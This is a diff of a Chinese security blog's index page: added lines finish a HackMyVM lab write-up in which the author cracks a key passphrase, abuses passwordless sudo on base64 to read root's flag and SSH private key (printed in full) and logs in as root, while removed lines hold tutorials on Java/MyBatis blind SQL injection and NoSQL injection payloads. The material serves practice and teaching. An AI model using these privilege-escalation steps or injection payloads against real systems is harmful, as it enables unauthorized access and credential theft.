32/64])</span><br><span class="line">No password hashes left to crack (see FAQ)</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# john 1 -w=1 --show</span><br><span class="line">Invalid options combination: &quot;--show&quot;</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# john 1  --show</span><br><span class="line">id_rsa:aWxvdmV5b3UK</span><br><span class="line"></span><br><span class="line">1 password hash cracked, 0 left</span><br></pre></td></tr></table></figure>
+
+<p>lucas用户的密码就是aWxvdmV5b3UK</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>ssh登录拿到user.txt</p>
+<p>sudo -l可以无密码运行base64，直接读取/root/root.txt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -d</span><br><span class="line">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class="line">                                   .     **</span><br><span class="line">                                *           *.</span><br><span class="line">                                              ,*</span><br><span class="line">                                                 *,</span><br><span class="line">                         ,                         ,*</span><br><span class="line">                      .,                              *,</span><br><span class="line">                    /                                    *</span><br><span class="line">                 ,*                                        *,</span><br><span class="line">               /.                                            .*.</span><br><span class="line">             *                                                  **</span><br><span class="line">             ,*                                               ,*</span><br><span class="line">                **                                          *.</span><br><span class="line">                   **                                    **.</span><br><span class="line">                     ,*                                **</span><br><span class="line">                        *,                          ,*</span><br><span class="line">                           *                      **</span><br><span class="line">                             *,                .*</span><br><span class="line">                                *.           **</span><br><span class="line">                                  **      ,*,</span><br><span class="line">                                     ** *,</span><br><span class="line"></span><br><span class="line">HMVFKBS64</span><br></pre></td></tr></table></figure>
+
+<p>想提权到root的话需要读取id_rsa</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -d</span><br><span class="line">sudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B</span><br><span class="line">IdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp</span><br><span class="line">DEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk</span><br><span class="line">/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7</span><br><span class="line">px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a</span><br><span class="line">S+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ</span><br><span class="line">7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx</span><br><span class="line">YQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v</span><br><span class="line">zEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO</span><br><span class="line">4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig</span><br><span class="line">yLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6</span><br><span class="line">oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5</span><br><span class="line">SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr</span><br><span class="line">nCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R</span><br><span class="line">iMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq</span><br><span class="line">vWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG</span><br><span class="line">ptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz</span><br><span class="line">X2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR</span><br><span class="line">fKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD</span><br><span class="line">SiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe</span><br><span class="line">FWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5</span><br><span class="line">rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR</span><br><span class="line">txBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an</span><br><span class="line">2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ssh root@192.168.31.232 -i id_rsa</span><br><span class="line">Linux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Wed Jan 22 08:08:11 2025 from 192.168.31.129</span><br><span class="line">root@MiWiFi-RA71-srv:~#</span><br></pre></td></tr></table></figure>
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在处理字典的时候还可以有更高效的方法，其他的就没啥了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/01/22/HackmyVM-Pwned/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1088,343 +1314,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/16/java%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">java注入学习</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-03-16 20:56:44" itemprop="dateCreated datePublished" datetime="2024-03-16T20:56:44+08:00">2024-03-16</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-03-17 17:26:32" itemprop="dateModified" datetime="2024-03-17T17:26:32+08:00">2024-03-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-                  ，
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/java/" itemprop="url" rel="index"><span itemprop="name">java</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>2.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><h3 id="JDBC是什么"><a href="#JDBC是什么" class="headerlink" title="JDBC是什么"></a>JDBC是什么</h3><p><strong>J</strong>ava <strong>D</strong>ata<strong>B</strong>ase <strong>C</strong>onnectivity（Java语言连接数据库）</p>
-<table>
-<thead>
-<tr>
-<th>接口或类</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>DriverManager类</strong></td>
-<td>1)管理和注册数据库驱动<br>2)得到数据库连接对象</td>
-</tr>
-<tr>
-<td><strong>Connection接口</strong></td>
-<td>一个连接对象，可用于创建Statement和PreparedStatement对象</td>
-</tr>
-<tr>
-<td><strong>Statemen接口</strong></td>
-<td>一个SQL语句对象，用于将SQL语句发送给数据库服务器</td>
-</tr>
-<tr>
-<td><strong>PreparedStetemen接口</strong></td>
-<td>一个SQL语句对象，是Statemen的子接口</td>
-</tr>
-<tr>
-<td><strong>ResultSet接口</strong></td>
-<td>用于封装数据库查询的结果集，返回给数据库Java程序</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>加载和注册驱动的方法</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Class.forName(数据库驱动实现类)</strong></td>
-<td>加载和注册数据库驱动，数据库驱动由mysql厂商”com.mysql.jbdc.Driver”</td>
-</tr>
-</tbody></table>
-<p>PrepareStatement会对SQL语句进行预编译，但如果直接采取拼接的方式构造SQL，此时进行预编译也无用。</p>
-<p>Statement不会对SQL语句进行预编译。</p>
-<p>两种操作都是因为SQL语句拼接导致的SQL注入。</p>
-<h2 id="MyBatis框架"><a href="#MyBatis框架" class="headerlink" title="MyBatis框架"></a>MyBatis框架</h2><p>在mybatis中的，使用<code>#</code>包裹的字段在内部进行了预编译处理，而<code>$</code>并没有使用预编译，也就是JDBC中prepareStatement和Statement的区别。mybatis的sql语句通常是写在xml文件中。</p>
-<h3 id="order-by-盲注"><a href="#order-by-盲注" class="headerlink" title="order by 盲注"></a>order by 盲注</h3><p>在SQL中是不允许union直接跟在order by后面的，所以我们可以考虑使用盲注或报错注入。</p>
-<p>我的理解就是通过order by将列进行排序，通过返回的不同结果</p>
-<p>举个简单的例子:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;1&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (0.002 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]&gt; select * from user order by (if(substr((select username from user limit 0,1),1,1)=&#x27;N&#x27;,sleep(1),1));</span><br><span class="line">+------------------+------------+</span><br><span class="line">| username         | password   |</span><br><span class="line">+------------------+------------+</span><br><span class="line">| Nakajima Ayato   | 9CXLGSEWDO |</span><br><span class="line">| Mildred Green    | r8ZPbvDXBC |</span><br><span class="line">| Ito Momoe        | qao7ysP90D |</span><br><span class="line">| Lo On Kay        | x8rGVqTQqd |</span><br><span class="line">| Kobayashi Sakura | lYiv7UO8Yo |</span><br><span class="line">+------------------+------------+</span><br><span class="line">5 rows in set (5.004 sec)</span><br></pre></td></tr></table></figure>
-
-<p>可以看到，当if语句成立时返回的时间为5s，但是不成立时为0.002s</p>
-<p>这是基于时间的盲注。</p>
-<p>还可以利用其它的方式来进行盲注</p>
-<p>例如：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> if(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,(<span class="keyword">select</span> host <span class="keyword">from</span> mysql.user));</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure>
-
-<p>如果if语句错误就会返回<code>ERROR 1242 (21000): Subquery returns more than 1 row</code>，当if成立时就会返回正常页面，可以通过返回的情况来判断。</p>
-<h3 id="rand-盲注"><a href="#rand-盲注" class="headerlink" title="rand()盲注"></a>rand()盲注</h3><p>原理和order by大差不差，就是rand()会产生一个0-1之间的随机数，我们给一个固定的种子就会生成一个固定的数，所以我们控制rand的种子就可以造成排序的结果不同。</p>
-<p>比如：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rand(1)</span><br><span class="line">rand(0)</span><br><span class="line">rand(1=1)</span><br><span class="line">rand(lenth(database())=8)</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
-
-<h3 id="和-符号的区别"><a href="#和-符号的区别" class="headerlink" title="#和$符号的区别"></a>#和$符号的区别</h3><p><strong>#{}</strong> </p>
-<p>使用#{}意味着使用的预编译的语句，即在使用jdbc时的preparedStatement，sql语句中如果存在参数则会使用?作占位符，我们知道这种方式可以防止sql注入，并且在使用#{}时形成的sql语句，已经带有引号，例，select * from table1 where id=#{id} 在调用这个语句时我们可以通过后台看到打印出的sql为：select * from table1 where id=’2’ 加入传的值为2.也就是说在组成sql语句的时候把参数默认为字符串。</p>
-<p><strong>${}</strong></p>
-<p>使用${}时的sql不会当做字符串处理，是什么就是什么，如上边的语句：select * from table1 where id=${id} 在调用这个语句时控制台打印的为：select * from table1 where id=2 ，假设传的参数值为2</p>
-<p>从上边的介绍可以看出这两种方式的区别，我们最好是能用#{}则用它，因为它可以防止sql注入，且是预编译的，在需要原样输出时才使用${}，如，</p>
-<p>select * from ${tableName} order by ${id} 这里需要传入表名和按照哪个列进行排序 ，加入传入table1、id 则语句为：select * from table1 order by id</p>
-<p>如果是使用#{} 则变成了select * from ‘table1’ order by ‘id’ 我们知道这样就不对了。</p>
-<p>另，在使用以下的配置时，必须使用#{}</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;select id=&quot;selectMessageByIdI&quot; parameterType=&quot;int&quot; resultType=&quot;Message&quot;&gt;</span><br><span class="line">         </span><br><span class="line">         select * from message where id=#&#123;id&#125;;</span><br><span class="line">     &lt;/select&gt;</span><br></pre></td></tr></table></figure>
-
-<p>在parameterType是int时，sql语句中必须是#{}。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p> <a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/360733.html">关于Java中order by注入详解</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="lvzhouhang">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="lvzhouhang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/03/12/NoSQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">NoSQL注入</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-03-12 15:28:01 / 修改时间：15:57:19" itemprop="dateCreated datePublished" datetime="2024-03-12T15:28:01+08:00">2024-03-12</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-file-word-o"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.7k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-clock-o"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="什么是NoSQL"><a href="#什么是NoSQL" class="headerlink" title="什么是NoSQL"></a>什么是NoSQL</h2><p>NoSQL，指的是非关系型的数据库。NoSQL 有时也称作 Not Only SQL 的缩写，是对不同于传统的<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cdb-overview?from_column=20065&from=20065">关系型数据库</a>的<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/dbbrain?from_column=20065&from=20065">数据库管理</a>系统的统称。NoSQL 用于超大规模数据的存储。（例如谷歌或 Facebook 每天为他们的用户收集万亿比特的数据）。这些类型的数据存储不需要固定的模式，无需多余操作就可以横向扩展。</p>
-<hr>
-<p>NoSQL 提供了新的数据模型和查询格式，从而可以规避常规的 SQL 注入攻击。但是，它们也为攻击者提供了插入恶意代码的新方法。总的来讲有四种注入手法：</p>
-<p><strong>1、重言式</strong></p>
-<p>又称为永真式（这个好像是数理逻辑里面的术语），此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
-<p><strong>2、联合查询</strong></p>
-<p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
-<p><strong>3、JavaScript 注入</strong></p>
-<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，传递不干净的用户输入到这些查询中可以注入任意 JavaScript 代码，导致非法的数据获取或篡改。</p>
-<p><strong>4、盲注</strong></p>
-<p>当页面没有回显时，那么我们可以通过<code>$regex</code>正则表达式来达到和 SQL 注入中<code>substr()</code>函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
-<hr>
-<p>对于 PHP 本身的特性而言，由于其松散的数组特性，导致如果我们输入<code>value=1</code>那么，也就是输入了一个 value 的值为 1 的数据。如果输入<code>value[$ne]=1</code>也就意味着<code>value=array($ne=&gt;1)</code>,在 MongoDB 中，原来的一个单个目标的查询变成了条件查询。同样的，我们也可以使用<code>username[$gt]=&amp;password[$gt]=</code>作为 payload 进行攻击。</p>
-<p>在我看来，nosql注入就是通过传入数组然后拼接恶意语句造成注入，和其他数据库的注入原理类似，但是语法有所不同。</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dyllove98/article/details/8990940">查询操作符</a></p>
-<p>nosql的查询操作符不用<code>or、and、=</code>等等，取而代之的是<code>$eq、$ne、$gt</code>等</p>
-<table>
-<thead>
-<tr>
-<th>方法名</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$gt</td>
-<td>大于</td>
-</tr>
-<tr>
-<td>$lte</td>
-<td>小于等于</td>
-</tr>
-<tr>
-<td>$in</td>
-<td>包含</td>
-</tr>
-<tr>
-<td>$nin</td>
-<td>不包含</td>
-</tr>
-<tr>
-<td>$lt</td>
-<td>小于</td>
-</tr>
-<tr>
-<td>$gte</td>
-<td>大于等于</td>
-</tr>
-<tr>
-<td>$ne</td>
-<td>不等于</td>
-</tr>
-<tr>
-<td>$eq</td>
-<td>等于</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>$and</th>
-<th>与</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>$nor</td>
-<td>$nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档</td>
-</tr>
-<tr>
-<td>$not</td>
-<td>反匹配(1.3.3及以上版本),字段值不匹配表达式或者字段值不存在</td>
-</tr>
-<tr>
-<td>$or</td>
-<td>或</td>
-</tr>
-</tbody></table>
-<p>例如：</p>
-<p>我们传入<code>username=admin&amp;password=123456</code></p>
-<p>后端就会处理成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">&#x27;username&#x27; =&gt; &#x27;admin&#x27;,</span><br><span class="line">&#x27;password&#x27; =&gt; &#x27;123456&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>如果我们传入<code>username[$ne]=1&amp;password[$ne]=1</code></p>
-<p>后端处理成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">&#x27;username&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1),</span><br><span class="line">&#x27;password&#x27; =&gt; array(&#x27;$ne&#x27; =&gt; 1)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-
-<p>查询的语句就会变成<code>db.users.find(&#123;&#39;username&#39;:&#123;$ne:1&#125;, &#39;password&#39;:&#123;$ne:1&#125;&#125;)</code></p>
-<p>意思就是查询username不等于1，password不等于1的用户</p>
-<p>此外,nosql还可以进行javascrip注入</p>
-<p>例如：<code>db.users.find( &#123; $where: function() &#123; return this.username == &#39;admin&#39;; &#125; &#125; )</code></p>
-<p>该查询返回在users集合中username等于admin的所有文档。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1602092">从零学习 NoSQL 注入之 Mongodb</a></p>
-<p><a target="_blank" rel="noopener" href="https://tcm-sec.com/get-started-with-nosql-injection-nosqli/">get-started-with-nosql-injection-nosqli</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1494,7 +1383,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">61</span>
+          <span class="site-state-item-count">63</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1543,12 +1432,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-area-chart"></i>
     </span>
-    <span title="站点总字数">335k</span>
+    <span title="站点总字数">340k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:05</span>
+    <span title="站点阅读时长">5:09</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
